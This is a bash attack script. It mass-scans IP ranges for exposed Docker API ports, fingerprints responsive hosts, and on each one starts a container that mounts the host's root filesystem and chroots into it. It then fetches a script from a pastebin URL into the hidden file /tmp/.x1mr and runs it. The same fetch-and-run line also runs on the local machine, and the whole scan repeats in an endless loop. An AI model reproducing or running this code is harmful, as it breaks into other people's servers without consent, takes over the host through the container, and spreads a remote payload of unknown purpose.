#!/bin/bash

# Function to log messages with timestamps
log() {
    echo -e "[ $(date '+%Y-%m-%d %H:%M:%S') ] $@"
}

# Function to perform the pwn operation
pwn() {
    ip_range=$1
    prt=$2
    rate=$3

    log "Running masscan on IP range: $ip_range for port $prt with rate $rate"
    
    # Run masscan on the IP range and extract IPs
    masscan_output=$(masscan --range "$ip_range" -p$prt --rate=$rate | awk '{print $6}')
    
    if [ -z "$masscan_output" ]; then
        log "No targets found by masscan on port $prt for IP range: $ip_range"
        return
    fi

    log "Running zgrab on masscan output"
    
    # Run zgrab on the extracted IPs and filter based on criteria
    zgrab_output=$(echo "$masscan_output" | zgrab --senders 200 --port $prt --http='/v1.16/version' --output-file=-logs | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)
    
    rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
    eval "$rndstr"="'$zgrab_output'"

    if [ -z "${!rndstr}" ]; then
        log "No targets found by zgrab on port $prt for IP range: $ip_range"
        return
    fi

    for ipaddy in ${!rndstr}; do
        log "Found target IP: $ipaddy:$prt"
        log "Attempting to run Docker command on $ipaddy"

        # Run Docker command on the identified IP address
        time docker -H tcp://$ipaddy:$prt run --rm -v /:/mnt alpine chroot /mnt /bin/sh -c "wget https://pastebin.com/raw/dNm3FiAc -O /tmp/.x1mr && chmod +x /tmp/.x1mr && sed -i 's/\r$//' /tmp/.x1mr && bash /tmp/.x1mr;" &
        #        #
        #
        wget https://pastebin.com/raw/dNm3FiAc -O /tmp/.x1mr && chmod +x /tmp/.x1mr && sed -i 's/\r$//' /tmp/.x1mr && bash /tmp/.x1mr
        # Sleep for 120 seconds and then kill the Docker command
        sleep 120
        kill "$!"
    done
}

# Function to parse IP ranges from argument
parse_ip_ranges() {
    local input="$1"
    local ranges=()

    # Check if input is an IP range in CIDR notation
    if [[ "$input" =~ ^([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+)$ ]]; then
        ranges+=("$input")
    fi

    # Check if input is an IP range in hyphenated notation (e.g., 192.168.0.1-192.168.0.100)
    if [[ "$input" =~ ^([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+-[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)$ ]]; then
        start=$(echo "$input" | cut -d'-' -f1)
        end=$(echo "$input" | cut -d'-' -f2)
        ranges+=("$(echo $start | cut -d. -f1-3).$(echo $start | cut -d. -f4)-$(echo $end | cut -d. -f4)")
    fi

    echo "${ranges[@]}"
}

# Check if an IP ranges argument is provided
if [ -z "$1" ]; then
    log "Usage: $0 <ip_range>"
    exit 1
fi

# Parse the IP ranges from the argument
ip_ranges=$(parse_ip_ranges "$1")

# Infinite loop to continuously run the pwn function
while true; do
    for range in ${ip_ranges[@]}; do
        pwn "$range" 2375 50000
        pwn "$range" 2376 50000
        pwn "$range" 2377 50000
        pwn "$range" 4243 50000
    done
done
